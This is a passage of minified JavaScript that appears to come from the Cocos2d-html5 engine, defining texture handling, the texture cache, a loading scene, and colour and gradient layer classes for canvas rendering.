	b[a.PIXEL_FORMAT_RGBA4444] = "RGBA4444";
	b[a.PIXEL_FORMAT_RGB5A1] = "RGB5A1";
	b[a.PIXEL_FORMAT_PVRTC4] = "PVRTC4";
	b[a.PIXEL_FORMAT_PVRTC2] = "PVRTC2";
	b = cc.Texture2D._B = {};
	b[a.PIXEL_FORMAT_RGBA8888] = 32;
	b[a.PIXEL_FORMAT_RGB888] = 24;
	b[a.PIXEL_FORMAT_RGB565] = 16;
	b[a.PIXEL_FORMAT_A8] = 8;
	b[a.PIXEL_FORMAT_I8] = 8;
	b[a.PIXEL_FORMAT_AI88] = 16;
	b[a.PIXEL_FORMAT_RGBA4444] = 16;
	b[a.PIXEL_FORMAT_RGB5A1] = 16;
	b[a.PIXEL_FORMAT_PVRTC4] = 4;
	b[a.PIXEL_FORMAT_PVRTC2] = 3;
	b = cc.Texture2D.prototype;
	cc.defineGetterSetter(b, "name", b.getName);
	cc.defineGetterSetter(b, "pixelFormat", b.getPixelFormat);
	cc.defineGetterSetter(b, "pixelsWidth", b.getPixelsWide);
	cc.defineGetterSetter(b, "pixelsHeight", b.getPixelsHigh);
	cc.defineGetterSetter(b, "width", b._getWidth);
	cc.defineGetterSetter(b, "height", b._getHeight);
	a.defaultPixelFormat = a.PIXEL_FORMAT_DEFAULT
};
cc._tmp.PrototypeTextureAtlas = function() {
	var a = cc.TextureAtlas.prototype;
	cc.defineGetterSetter(a, "totalQuads", a.getTotalQuads);
	cc.defineGetterSetter(a, "capacity", a.getCapacity);
	cc.defineGetterSetter(a, "quads", a.getQuads, a.setQuads)
};
cc.ALIGN_CENTER = 51;
cc.ALIGN_TOP = 19;
cc.ALIGN_TOP_RIGHT = 18;
cc.ALIGN_RIGHT = 50;
cc.ALIGN_BOTTOM_RIGHT = 34;
cc.ALIGN_BOTTOM = 35;
cc.ALIGN_BOTTOM_LEFT = 33;
cc.ALIGN_LEFT = 49;
cc.ALIGN_TOP_LEFT = 17;
cc.PVRHaveAlphaPremultiplied_ = !1;
cc._renderType === cc._RENDER_TYPE_CANVAS ? cc.Texture2D = cc.Class.extend({
	_contentSize: null,
	_isLoaded: !1,
	_htmlElementObj: null,
	_loadedEventListeners: null,
	url: null,
	ctor: function() {
		this._contentSize = cc.size(0, 0);
		this._isLoaded = !1;
		this._htmlElementObj = null
	},
	getPixelsWide: function() {
		return this._contentSize.width
	},
	getPixelsHigh: function() {
		return this._contentSize.height
	},
	getContentSize: function() {
		var a = cc.contentScaleFactor();
		return cc.size(this._contentSize.width / a, this._contentSize.height / a)
	},
	_getWidth: function() {
		return this._contentSize.width / cc.contentScaleFactor()
	},
	_getHeight: function() {
		return this._contentSize.height / cc.contentScaleFactor()
	},
	getContentSizeInPixels: function() {
		return this._contentSize
	},
	initWithElement: function(a) {
		a && (this._htmlElementObj = a)
	},
	getHtmlElementObj: function() {
		return this._htmlElementObj
	},
	isLoaded: function() {
		return this._isLoaded
	},
	handleLoadedTexture: function() {
		if (!this._isLoaded) {
			if (!this._htmlElementObj) {
				var a = cc.loader.getRes(this.url);
				if (!a) return;
				this.initWithElement(a)
			}
			this._isLoaded = !0;
			a = this._htmlElementObj;
			this._contentSize.width = a.width;
			this._contentSize.height = a.height;
			this._callLoadedEventCallbacks()
		}
	},
	description: function() {
		return "\x3ccc.Texture2D | width \x3d " + this._contentSize.width + " height " + this._contentSize.height + "\x3e"
	},
	initWithData: function(a, b, c, d, e) {
		return !1
	},
	initWithImage: function(a) {
		return !1
	},
	initWithString: function(a, b, c, d, e, f) {
		return !1
	},
	releaseTexture: function() {},
	getName: function() {
		return null
	},
	getMaxS: function() {
		return 1
	},
	setMaxS: function(a) {},
	getMaxT: function() {
		return 1
	},
	setMaxT: function(a) {},
	getPixelFormat: function() {
		return null
	},
	getShaderProgram: function() {
		return null
	},
	setShaderProgram: function(a) {},
	hasPremultipliedAlpha: function() {
		return !1
	},
	hasMipmaps: function() {
		return !1
	},
	releaseData: function(a) {},
	keepData: function(a, b) {
		return a
	},
	drawAtPoint: function(a) {},
	drawInRect: function(a) {},
	initWithETCFile: function(a) {
		cc.log(cc._LogInfos.Texture2D_initWithETCFile);
		return !1
	},
	initWithPVRFile: function(a) {
		cc.log(cc._LogInfos.Texture2D_initWithPVRFile);
		return !1
	},
	initWithPVRTCData: function(a, b, c, d, e, f) {
		cc.log(cc._LogInfos.Texture2D_initWithPVRTCData);
		return !1
	},
	setTexParameters: function(a) {},
	setAntiAliasTexParameters: function() {},
	setAliasTexParameters: function() {},
	generateMipmap: function() {},
	stringForFormat: function() {
		return ""
	},
	bitsPerPixelForFormat: function(a) {
		return -1
	},
	addLoadedEventListener: function(a, b) {
		this._loadedEventListeners || (this._loadedEventListeners = []);
		this._loadedEventListeners.push({
			eventCallback: a,
			eventTarget: b
		})
	},
	removeLoadedEventListener: function(a) {
		if (this._loadedEventListeners) for (var b = this._loadedEventListeners, c = 0; c < b.length; c++) b[c].eventTarget == a && b.splice(c, 1)
	},
	_callLoadedEventCallbacks: function() {
		if (this._loadedEventListeners) {
			for (var a = this._loadedEventListeners, b = 0, c = a.length; b < c; b++) {
				var d = a[b];
				d.eventCallback.call(d.eventTarget, this)
			}
			a.length = 0
		}
	}
}) : (cc.assert("function" === typeof cc._tmp.WebGLTexture2D, cc._LogInfos.MissingFile, "TexturesWebGL.js"), cc._tmp.WebGLTexture2D(), delete cc._tmp.WebGLTexture2D);
cc.assert("function" === typeof cc._tmp.PrototypeTexture2D, cc._LogInfos.MissingFile, "TexturesPropertyDefine.js");
cc._tmp.PrototypeTexture2D();
delete cc._tmp.PrototypeTexture2D;
cc.textureCache = {
	_textures: {},
	_textureColorsCache: {},
	_textureKeySeq: 0 | 1E3 * Math.random(),
	_loadedTexturesBefore: {},
	_initializingRenderer: function() {
		var a, b = this._loadedTexturesBefore,
			c = this._textures;
		for (a in b) {
			var d = b[a];
			d.handleLoadedTexture();
			c[a] = d
		}
		this._loadedTexturesBefore = {}
	},
	addPVRTCImage: function(a) {
		cc.log(cc._LogInfos.textureCache_addPVRTCImage)
	},
	addETCImage: function(a) {
		cc.log(cc._LogInfos.textureCache_addETCImage)
	},
	description: function() {
		return "\x3cTextureCache | Number of textures \x3d " + this._textures.length + "\x3e"
	},
	textureForKey: function(a) {
		return this._textures[a] || this._textures[cc.loader._aliases[a]]
	},
	getKeyByTexture: function(a) {
		for (var b in this._textures) if (this._textures[b] == a) return b;
		return null
	},
	_generalTextureKey: function() {
		this._textureKeySeq++;
		return "_textureKey_" + this._textureKeySeq
	},
	getTextureColors: function(a) {
		var b = this.getKeyByTexture(a);
		b || (b = a instanceof HTMLImageElement ? a.src : this._generalTextureKey());
		this._textureColorsCache[b] || (this._textureColorsCache[b] = cc.generateTextureCacheForColor(a));
		return this._textureColorsCache[b]
	},
	addPVRImage: function(a) {
		cc.log(cc._LogInfos.textureCache_addPVRImage)
	},
	removeAllTextures: function() {
		var a = this._textures,
			b;
		for (b in a) a[b] && a[b].releaseTexture();
		this._textures = {}
	},
	removeTexture: function(a) {
		if (a) {
			var b = this._textures,
				c;
			for (c in b) b[c] == a && (b[c].releaseTexture(), delete b[c])
		}
	},
	removeTextureForKey: function(a) {
		null != a && this._textures[a] && delete this._textures[a]
	},
	cacheImage: function(a, b) {
		if (b instanceof cc.Texture2D) this._textures[a] = b;
		else {
			var c = new cc.Texture2D;
			c.initWithElement(b);
			c.handleLoadedTexture();
			this._textures[a] = c
		}
	},
	addUIImage: function(a, b) {
		cc.assert(a, cc._LogInfos.textureCache_addUIImage_2);
		if (b && this._textures[b]) return this._textures[b];
		var c = new cc.Texture2D;
		c.initWithImage(a);
		null != b && null != c ? this._textures[b] = c : cc.log(cc._LogInfos.textureCache_addUIImage);
		return c
	},
	dumpCachedTextureInfo: function() {
		var a = 0,
			b = 0,
			c = this._textures,
			d;
		for (d in c) {
			var e = c[d];
			a++;
			e.getHtmlElementObj() instanceof HTMLImageElement ? cc.log(cc._LogInfos.textureCache_dumpCachedTextureInfo, d, e.getHtmlElementObj().src, e.pixelsWidth, e.pixelsHeight) : cc.log(cc._LogInfos.textureCache_dumpCachedTextureInfo_2, d, e.pixelsWidth, e.pixelsHeight);
			b += 4 * e.pixelsWidth * e.pixelsHeight
		}
		c = this._textureColorsCache;
		for (d in c) {
			var e = c[d],
				f;
			for (f in e) {
				var g = e[f];
				a++;
				cc.log(cc._LogInfos.textureCache_dumpCachedTextureInfo_2, d, g.width, g.height);
				b += 4 * g.width * g.height
			}
		}
		cc.log(cc._LogInfos.textureCache_dumpCachedTextureInfo_3, a, b / 1024, (b / 1048576).toFixed(2))
	},
	_clear: function() {
		this._textures = {};
		this._textureColorsCache = {};
		this._textureKeySeq = 0 | 1E3 * Math.random();
		this._loadedTexturesBefore = {}
	}
};
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.textureCache, _p.handleLoadedTexture = function(a) {
	var b = this._textures,
		c = b[a];
	c || (c = b[a] = new cc.Texture2D, c.url = a);
	c.handleLoadedTexture()
}, _p.addImage = function(a, b, c) {
	cc.assert(a, cc._LogInfos.Texture2D_addImage);
	var d = this._textures,
		e = d[a] || d[cc.loader._aliases[a]];
	if (e) return b && b.call(c), e;
	e = d[a] = new cc.Texture2D;
	e.url = a;
	cc.loader.getRes(a) ? e.handleLoadedTexture() : cc.loader._checkIsImageURL(a) ? cc.loader.load(a, function(a) {
		b && b.call(c)
	}) : cc.loader.cache[a] = cc.loader.loadImg(a, function(c, d) {
		if (c) return b ? b(c) : c;
		cc.textureCache.handleLoadedTexture(a);
		b && b(null, d)
	});
	return e
}, _p = null) : (cc.assert("function" === typeof cc._tmp.WebGLTextureCache, cc._LogInfos.MissingFile, "TexturesWebGL.js"), cc._tmp.WebGLTextureCache(), delete cc._tmp.WebGLTextureCache);
cc.Scene = cc.Node.extend({
	_className: "Scene",
	ctor: function() {
		cc.Node.prototype.ctor.call(this);
		this._ignoreAnchorPointForPosition = !0;
		this.setAnchorPoint(0.5, 0.5);
		this.setContentSize(cc.director.getWinSize())
	}
});
cc.Scene.create = function() {
	return new cc.Scene
};
cc.LoaderScene = cc.Scene.extend({
	_interval: null,
	_length: 0,
	_count: 0,
	_label: null,
	_className: "LoaderScene",
	init: function() {
		var a = this,
			b = 200,
			c = a._bgLayer = cc.LayerColor.create(cc.color(32, 32, 32, 255));
		c.setPosition(cc.visibleRect.bottomLeft);
		a.addChild(c, 0);
		var d = 24,
			e = -b / 2 + 100;
		cc._loaderImage && (cc.loader.loadImg(cc._loaderImage, {
			isCrossOrigin: !1
		}, function(c, d) {
			b = d.height;
			a._initStage(d, cc.visibleRect.center)
		}), d = 14, e = -b / 2 - 10);
		d = a._label = cc.LabelTTF.create("Loading... 0%", "Arial", d);
		d.setPosition(cc.pAdd(cc.visibleRect.center, cc.p(0, e)));
		d.setColor(cc.color(180, 180, 180));
		c.addChild(this._label, 10);
		return !0
	},
	_initStage: function(a, b) {
		var c = this._texture2d = new cc.Texture2D;
		c.initWithElement(a);
		c.handleLoadedTexture();
		c = this._logo = cc.Sprite.create(c);
		c.setScale(cc.contentScaleFactor());
		c.x = b.x;
		c.y = b.y;
		this._bgLayer.addChild(c, 10)
	},
	onEnter: function() {
		cc.Node.prototype.onEnter.call(this);
		this.schedule(this._startLoading, 0.3)
	},
	onExit: function() {
		cc.Node.prototype.onExit.call(this);
		this._label.setString("Loading... 0%")
	},
	initWithResources: function(a, b) {
		"string" == typeof a && (a = [a]);
		this.resources = a || [];
		this.cb = b
	},
	_startLoading: function() {
		var a = this;
		a.unschedule(a._startLoading);
		var b = a.resources;
		a._length = b.length;
		a._count = 0;
		cc.loader.load(b, function(b, d) {
			a._count = d
		}, function() {
			a.cb && a.cb()
		});
		a.schedule(a._updatePercent)
	},
	_updatePercent: function() {
		var a = this._count,
			b = this._length,
			c;
		c = Math.min(100 * (a / b) | 0, 100);
		this._label.setString("Loading... " + c + "%");
		a >= b && this.unschedule(this._updatePercent)
	}
});
cc.LoaderScene.preload = function(a, b) {
	var c = cc;
	c.loaderScene || (c.loaderScene = new cc.LoaderScene, c.loaderScene.init());
	c.loaderScene.initWithResources(a, b);;
	cc.director.runScene(c.loaderScene);
	return c.loaderScene
};
cc._tmp.PrototypeLayerRGBA = function() {
	var a = cc.LayerRGBA.prototype;
	cc.defineGetterSetter(a, "opacityModifyRGB", a.isOpacityModifyRGB, a.setOpacityModifyRGB);
	cc.defineGetterSetter(a, "opacity", a.getOpacity, a.setOpacity);
	cc.defineGetterSetter(a, "cascadeOpacity", a.isCascadeOpacityEnabled, a.setCascadeOpacityEnabled);
	cc.defineGetterSetter(a, "color", a.getColor, a.setColor);
	cc.defineGetterSetter(a, "cascadeColor", a.isCascadeColorEnabled, a.setCascadeColorEnabled)
};
cc._tmp.PrototypeLayerColor = function() {
	var a = cc.LayerColor.prototype;
	cc.defineGetterSetter(a, "width", a._getWidth, a._setWidth);
	cc.defineGetterSetter(a, "height", a._getHeight, a._setHeight)
};
cc._tmp.PrototypeLayerGradient = function() {
	var a = cc.LayerGradient.prototype;
	cc.defineGetterSetter(a, "startColor", a.getStartColor, a.setStartColor);
	cc.defineGetterSetter(a, "endColor", a.getEndColor, a.setEndColor);
	cc.defineGetterSetter(a, "startOpacity", a.getStartOpacity, a.setStartOpacity);
	cc.defineGetterSetter(a, "endOpacity", a.getEndOpacity, a.setEndOpacity);
	cc.defineGetterSetter(a, "vector", a.getVector, a.setVector)
};
cc.Layer = cc.Node.extend({
	_isBaked: !1,
	_bakeSprite: null,
	_className: "Layer",
	ctor: function() {
		var a = cc.Node.prototype;
		a.ctor.call(this);
		this._ignoreAnchorPointForPosition = !0;
		a.setAnchorPoint.call(this, 0.5, 0.5);
		a.setContentSize.call(this, cc.winSize)
	},
	bake: null,
	unbake: null,
	isBaked: function() {
		return this._isBaked
	},
	visit: null
});
cc.Layer.create = function() {
	return new cc.Layer
};
if (cc._renderType === cc._RENDER_TYPE_CANVAS) {
	var p = cc.Layer.prototype;
	p.bake = function() {
		if (!this._isBaked) {
			this._isBaked = this._cacheDirty = !0;
			this._cachedParent = this;
			for (var a = this._children, b = 0, c = a.length; b < c; b++) a[b]._setCachedParent(this);
			this._bakeSprite || (this._bakeSprite = new cc.BakeSprite)
		}
	};
	p.unbake = function() {
		if (this._isBaked) {
			this._isBaked = !1;
			this._cacheDirty = !0;
			this._cachedParent = null;
			for (var a = this._children, b = 0, c = a.length; b < c; b++) a[b]._setCachedParent(null)
		}
	};
	p.visit = function(a) {
		if (this._isBaked) {
			a = a || cc._renderContext;
			var b, c = this._children,
				d = c.length;
			if (this._visible && 0 !== d) {
				var e = this._bakeSprite;
				a.save();
				this.transform(a);
				if (this._cacheDirty) {
					b = this._getBoundingBoxForBake();
					b.width |= 0;
					b.height |= 0;
					var f = e.getCacheContext();
					e.resetCanvasSize(b.width, b.height);
					f.translate(0 - b.x, b.height + b.y);
					var g = e.getAnchorPointInPoints();
					e.setPosition(g.x + b.x, g.y + b.y);
					this.sortAllChildren();
					for (b = 0; b < d; b++) c[b].visit(f);
					this._cacheDirty = !1
				}
				e.visit(a);
				this.arrivalOrder = 0;
				a.restore()
			}
		} else cc.Node.prototype.visit.call(this, a)
	};
	p._getBoundingBoxForBake = function() {
		var a = null;
		if (!this._children || 0 === this._children.length) return cc.rect(0, 0, 10, 10);
		for (var b = this._children, c = 0; c < b.length; c++) {
			var d = b[c];
			d && d._visible && (a ? (d = d._getBoundingBoxToCurrentNode()) && (a = cc.rectUnion(a, d)) : a = d._getBoundingBoxToCurrentNode())
		}
		return a
	};
	p = null
} else cc.assert("function" === typeof cc._tmp.LayerDefineForWebGL, cc._LogInfos.MissingFile, "CCLayerWebGL.js"), cc._tmp.LayerDefineForWebGL(), delete cc._tmp.LayerDefineForWebGL;
cc.LayerRGBA = cc.Layer.extend({
	RGBAProtocol: !0,
	_displayedOpacity: 255,
	_realOpacity: 255,
	_displayedColor: null,
	_realColor: null,
	_cascadeOpacityEnabled: !1,
	_cascadeColorEnabled: !1,
	_className: "LayerRGBA",
	ctor: function() {
		cc.Layer.prototype.ctor.call(this);
		this._displayedColor = cc.color(255, 255, 255, 255);
		this._realColor = cc.color(255, 255, 255, 255)
	},
	init: function() {
		var a = cc.Layer.prototype;
		this._ignoreAnchorPointForPosition = !0;
		a.setAnchorPoint.call(this, 0.5, 0.5);
		a.setContentSize.call(this, cc.winSize);
		this.cascadeColor = this.cascadeOpacity = !1;
		return !0
	},
	getOpacity: function() {
		return this._realOpacity
	},
	getDisplayedOpacity: function() {
		return this._displayedOpacity
	},
	setOpacity: function(a) {
		this._displayedOpacity = this._realOpacity = a;
		var b = 255,
			c = this._parent;
		c && (c.RGBAProtocol && c.cascadeOpacity) && (b = c.getDisplayedOpacity());
		this.updateDisplayedOpacity(b);
		this._displayedColor.a = this._realColor.a = a
	},
	updateDisplayedOpacity: function(a) {
		this._displayedOpacity = 0 | this._realOpacity * a / 255;
		if (this._cascadeOpacityEnabled) {
			a = this._children;
			for (var b, c = 0; c < a.length; c++)(b = a[c]) && b.RGBAProtocol && b.updateDisplayedOpacity(this._displayedOpacity)
		}
	},
	isCascadeOpacityEnabled: function() {
		return this._cascadeOpacityEnabled
	},
	setCascadeOpacityEnabled: function(a) {
		this._cascadeOpacityEnabled !== a && ((this._cascadeOpacityEnabled = a) ? this._enableCascadeOpacity() : this._disableCascadeOpacity())
	},
	_enableCascadeOpacity: function() {
		var a = 255,
			b = this._parent;
		b && (b.RGBAProtocol && b.cascadeOpacity) && (a = b.getDisplayedOpacity());
		this.updateDisplayedOpacity(a)
	},
	_disableCascadeOpacity: function() {
		this._displayedOpacity = this._realOpacity;
		for (var a = this._children, b, c = 0; c < a.length; c++)(b = a[c]) && b.RGBAProtocol && b.updateDisplayedOpacity(255)
	},
	getColor: function() {
		var a = this._realColor;
		return cc.color(a.r, a.g, a.b, a.a)
	},
	getDisplayedColor: function() {
		var a = this._displayedColor;
		return cc.color(a.r, a.g, a.b)
	},
	setColor: function(a) {
		var b = this._displayedColor,
			c = this._realColor;
		b.r = c.r = a.r;
		b.g = c.g = a.g;
		b.b = c.b = a.b;
		b = (b = this._parent) && b.RGBAProtocol && b.cascadeColor ? b.getDisplayedColor() : cc.color.WHITE;
		this.updateDisplayedColor(b);
		void 0 !== a.a && !a.a_undefined && this.setOpacity(a.a)
	},
	updateDisplayedColor: function(a) {
		var b = this._displayedColor,
			c = this._realColor;
		b.r = 0 | c.r * a.r / 255;
		b.g = 0 | c.g * a.g / 255;
		b.b = 0 | c.b * a.b / 255;
		if (this._cascadeColorEnabled) {
			a = this._children;
			for (var d = 0; d < a.length; d++)(c = a[d]) && c.RGBAProtocol && c.updateDisplayedColor(b)
		}
	},
	isCascadeColorEnabled: function() {
		return this._cascadeColorEnabled
	},
	setCascadeColorEnabled: function(a) {
		this._cascadeColorEnabled !== a && ((this._cascadeColorEnabled = a) ? this._enableCascadeColor() : this._disableCascadeColor())
	},
	_enableCascadeColor: function() {
		var a;
		a = (a = this._parent) && a.RGBAProtocol && a.cascadeColor ? a.getDisplayedColor() : cc.color.WHITE;
		this.updateDisplayedColor(a)
	},
	_disableCascadeColor: function() {
		var a = this._displayedColor,
			b = this._realColor;
		a.r = b.r;
		a.g = b.g;
		a.b = b.b;
		var a = this._children,
			b = cc.color.WHITE,
			c, d;
		for (d = 0; d < a.length; d++)(c = a[d]) && c.RGBAProtocol && c.updateDisplayedColor(b)
	},
	addChild: function(a, b, c) {
		cc.Node.prototype.addChild.call(this, a, b, c);
		this._cascadeColorEnabled && this._enableCascadeColor();
		this._cascadeOpacityEnabled && this._enableCascadeOpacity()
	},
	setOpacityModifyRGB: function(a) {},
	isOpacityModifyRGB: function() {
		return !1
	}
});
cc.assert("function" === typeof cc._tmp.PrototypeLayerRGBA, cc._LogInfos.MissingFile, "CCLayerPropertyDefine.js");
cc._tmp.PrototypeLayerRGBA();
delete cc._tmp.PrototypeLayerRGBA;
cc.LayerColor = cc.LayerRGBA.extend({
	_blendFunc: null,
	_className: "LayerColor",
	getBlendFunc: function() {
		return this._blendFunc
	},
	changeWidthAndHeight: function(a, b) {
		this.width = a;
		this.height = b
	},
	changeWidth: function(a) {
		this.width = a
	},
	changeHeight: function(a) {
		this.height = a
	},
	setOpacityModifyRGB: function(a) {},
	isOpacityModifyRGB: function() {
		return !1
	},
	setColor: function(a) {
		cc.LayerRGBA.prototype.setColor.call(this, a);
		this._updateColor()
	},
	setOpacity: function(a) {
		cc.LayerRGBA.prototype.setOpacity.call(this, a);
		this._updateColor()
	},
	_isLighterMode: !1,
	ctor: null,
	init: function(a, b, c) {
		cc._renderType !== cc._RENDER_TYPE_CANVAS && (this.shaderProgram = cc.shaderCache.programForKey(cc.SHADER_POSITION_COLOR));
		var d = cc.director.getWinSize();
		a = a || cc.color(0, 0, 0, 255);
		b = void 0 === b ? d.width : b;
		c = void 0 === c ? d.height : c;
		d = this._displayedColor;
		d.r = a.r;
		d.g = a.g;
		d.b = a.b;
		d = this._realColor;
		d.r = a.r;
		d.g = a.g;
		d.b = a.b;
		this._realOpacity = this._displayedOpacity = a.a;
		a = cc.LayerColor.prototype;
		a.setContentSize.call(this, b, c);
		a._updateColor.call(this);
		return !0
	},
	setBlendFunc: function(a, b) {
		this._blendFunc = void 0 === b ? a : {
			src: a,
			dst: b
		};
		cc._renderType === cc._RENDER_TYPE_CANVAS && (this._isLighterMode = this._blendFunc && 1 == this._blendFunc.src && 771 == this._blendFunc.dst)
	},
	_setWidth: null,
	_setHeight: null,
	_updateColor: null,
	updateDisplayedColor: function(a) {
		cc.LayerRGBA.prototype.updateDisplayedColor.call(this, a);
		this._updateColor()
	},
	updateDisplayedOpacity: function(a) {
		cc.LayerRGBA.prototype.updateDisplayedOpacity.call(this, a);
		this._updateColor()
	},
	draw: null
});
cc.LayerColor.create = function(a, b, c) {
	return new cc.LayerColor(a, b, c)
};
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.LayerColor.prototype, _p.ctor = function(a, b, c) {
	cc.LayerRGBA.prototype.ctor.call(this);
	this._blendFunc = new cc.BlendFunc(cc.BLEND_SRC, cc.BLEND_DST);
	cc.LayerColor.prototype.init.call(this, a, b, c)
}, _p._setWidth = cc.LayerRGBA.prototype._setWidth, _p._setHeight = cc.LayerRGBA.prototype._setHeight, _p._updateColor = function() {}, _p.draw = function(a) {
	a = a || cc._renderContext;
	var b = cc.view,
		c = this._displayedColor;
	a.fillStyle = "rgba(" + (0 | c.r) + "," + (0 | c.g) + "," + (0 | c.b) + "," + this._displayedOpacity / 255 + ")";
	a.fillRect(0, 0, this.width * b.getScaleX(), -this.height * b.getScaleY());
	cc.g_NumberOfDraws++
}, _p.visit = function(a) {
	if (this._isBaked) {

		a = a || cc._renderContext;
		var b, c = this._children,
			d = c.length;
		if (this._visible) {
			var e = this._bakeSprite;
			a.save();
			this.transform(a);
			if (this._cacheDirty) {
				b = this._getBoundingBoxForBake();
				b.width |= 0;
				b.height |= 0;
				var f = e.getCacheContext();
				e.resetCanvasSize(b.width, b.height);
				var g = e.getAnchorPointInPoints(),
					h = this._position;
				if (this._ignoreAnchorPointForPosition) f.translate(0 - b.x + h.x, b.height + b.y - h.y), e.setPosition(g.x + b.x - h.x, g.y + b.y - h.y);
				else {
					var k = this.getAnchorPointInPoints(),
						l = h.x - k.x,
						h = h.y - k.y;
					f.translate(0 - b.x + l, b.height + b.y - h);
					e.setPosition(g.x + b.x - l, g.y + b.y - h)
				}
				if (0 < d) {
					this.sortAllChildren();
					for (b = 0; b < d; b++) if (g = c[b], 0 > g._localZOrder) g.visit(f);
					else break;
					for (this.draw(f); b < d; b++) c[b].visit(f)
				} else this.draw(f);
				this._cacheDirty = !1
			}
			e.visit(a);
			this.arrivalOrder = 0;
			a.restore()
		}
	} else cc.Node.prototype.visit.call(this, a)
}, _p._getBoundingBoxForBake = function() {
	var a = cc.rect(0, 0, this._contentSize.width, this._contentSize.height),
		b = this.nodeToWorldTransform(),
		a = cc.RectApplyAffineTransform(a, this.nodeToWorldTransform());
	if (!this._children || 0 === this._children.length) return a;
	for (var c = this._children, d = 0; d < c.length; d++) {
		var e = c[d];
		e && e._visible && (e = e._getBoundingBoxToCurrentNode(b), a = cc.rectUnion(a, e))
	}
	return a
}, _p = null) : (cc.assert("function" === typeof cc._tmp.WebGLLayerColor, cc._LogInfos.MissingFile, "CCLayerWebGL.js"), cc._tmp.WebGLLayerColor(), delete cc._tmp.WebGLLayerColor);
cc.assert("function" === typeof cc._tmp.PrototypeLayerColor, cc._LogInfos.MissingFile, "CCLayerPropertyDefine.js");
cc._tmp.PrototypeLayerColor();
delete cc._tmp.PrototypeLayerColor;
cc.LayerGradient = cc.LayerColor.extend({
	_startColor: null,
	_endColor: null,
	_startOpacity: 255,
	_endOpacity: 255,
	_alongVector: null,
	_compressedInterpolation: !1,
	_gradientStartPoint: null,
	_gradientEndPoint: null,
	_className: "LayerGradient",
	ctor: function(a, b, c) {
		cc.LayerColor.prototype.ctor.call(this);
		this._startColor = cc.color(0, 0, 0, 255);
		this._endColor = cc.color(0, 0, 0, 255);
		this._alongVector = cc.p(0, -1);
		this._endOpacity = this._startOpacity = 255;
		this._gradientStartPoint = cc.p(0, 0);
		this._gradientEndPoint = cc.p(0, 0);
		cc.LayerGradient.prototype.init.call(this, a, b, c)
	},
	init: function(a, b, c) {
		a = a || cc.color(0, 0, 0, 255);
		b = b || cc.color(0, 0, 0, 255);
		c = c || cc.p(0, -1);
		var d = this._startColor,
			e = this._endColor;
		d.r = a.r;
		d.g = a.g;
		d.b = a.b;
		this._startOpacity = a.a;
		e.r = b.r;
		e.g = b.g;
		e.b = b.b;
		this._endOpacity = b.a;
		this._alongVector = c;
		this._compressedInterpolation = !0;
		this._gradientStartPoint = cc.p(0, 0);
		this._gradientEndPoint = cc.p(0, 0);
		cc.LayerColor.prototype.init.call(this, cc.color(a.r, a.g, a.b, 255));
		cc.LayerGradient.prototype._updateColor.call(this);
		return !0
	},
	setContentSize: function(a, b) {
		cc.LayerColor.prototype.setContentSize.call(this, a, b);
		this._updateColor()
	},
	_setWidth: function(a) {
		cc.LayerColor.prototype._setWidth.call(this, a);
		this._updateColor()
	},
	_setHeight: function(a) {
		cc.LayerColor.prototype._setHeight.call(this, a);
		this._updateColor()
	},
	getStartColor: function() {
		return this._realColor
	},
	setStartColor: function(a) {
		this.color = a
	},
	setEndColor: function(a) {
		this._endColor = a;
		this._updateColor()
	},
	getEndColor: function() {
		return this._endColor
	},
	setStartOpacity: function(a) {
		this._startOpacity = a;
		this._updateColor()
	},
	getStartOpacity: function() {
		return this._startOpacity
	},
	setEndOpacity: function(a) {
		this._endOpacity = a;
		this._updateColor()
	},
	getEndOpacity: function() {
		return this._endOpacity
	},
	setVector: function(a) {
		this._alongVector.x = a.x;
		this._alongVector.y = a.y;
		this._updateColor()
	},
	getVector: function() {
		return cc.p(this._alongVector.x, this._alongVector.y)
	},
	isCompressedInterpolation: function() {
		return this._compressedInterpolation
	},
	setCompressedInterpolation: function(a) {
		this._compressedInterpolation = a;
		this._updateColor()
	},
	_draw: null,
	_updateColor: null
});
cc.LayerGradient.create = function(a, b, c) {
	return new cc.LayerGradient(a, b, c)
};
cc._renderType === cc._RENDER_TYPE_CANVAS ? (_p = cc.LayerGradient.prototype, _p.draw = function(a) {
	a = a || cc._renderContext;
	this._isLighterMode && (a.globalCompositeOperation = "lighter");
	a.save();
	var b = cc.view,
		c = this._displayedOpacity / 255,
		d = this.width * b.getScaleX(),
		b = this.height * b.getScaleY(),
		e = a.createLinearGradient(this._gradientStartPoint.x, this._gradientStartPoint.y, this._gradientEndPoint.x, this._gradientEndPoint.y),
		f = this._displayedColor,
		g = this._endColor;
	e.addColorStop(0, "rgba(" + Math.round(f.r) + "," + Math.round(f.g) + "," + Math.round(f.b) + "," + (c * (this._startOpacity / 255)).toFixed(4) + ")");
	e.addColorStop(1, "rgba(" + Math.round(g.r) + "," + Math.round(g.g) + "," + Math.round(g.b) + "," + (c * (this._endOpacity / 255)).toFixed(4) + ")");
	a.fillStyle = e;
	a.fillRect(0, 0, d, -b);
	0 != this._rotation && a.rotate(this._rotationRadians);
	a.restore()
}, _p._updateColor = function() {
	var a = this._alongVector,
		b = 0.5 * this.width,
		c = 0.5 * this.height;
	this._gradientStartPoint.x = b * -a.x + b;
	this._gradientStartPoint.y = c * a.y - c;
	this._gradientEndPoint.x = b * a.x + b;
	this._gradientEndPoint.y = c * -a.y - c
}, _p = null) : (cc.assert("function" === typeof cc._tmp.WebGLLayerGradient, cc._LogInfos.MissingFile, "CCLayerWebGL.js"), cc._tmp.WebGLLayerGradient(), delete cc._tmp.WebGLLayerGradient);
cc.assert("function" === typeof cc._tmp.PrototypeLayerGradient, cc._LogInfos.MissingFile, "CCLayerPropertyDefine.js");
cc._tmp.PrototypeLayerGradient();
delete cc._tmp.PrototypeLayerGradient;
cc.LayerMultiplex = cc.Layer.extend({
	_enabledLayer: 0,
	_layers: null,
	_className: "LayerMultiplex",
	ctor: function(a) {
		cc.Layer.prototype.ctor.call(this);
		a && cc.LayerMultiplex.prototype.initWithLayers.call(this, a)
	},
	initWithLayers: function(a) {
		0 < a.length && null == a[a.length - 1] && cc.log(cc._LogInfos.LayerMultiplex_initWithLayers);
		this._layers = a;
		this._enabledLayer = 0;
		this.addChild(this._layers[this._enabledLayer]);
		return !0
	},
	switchTo: function(a) {
		a >= this._layers.length ? cc.log(cc._LogInfos.LayerMultiplex_switchTo) : (this.removeChild(this._layers[this._enabledLayer], !0), this._enabledLayer = a, this.addChild(this._layers[a]))
	},
	switchToAndReleaseMe: function(a) {
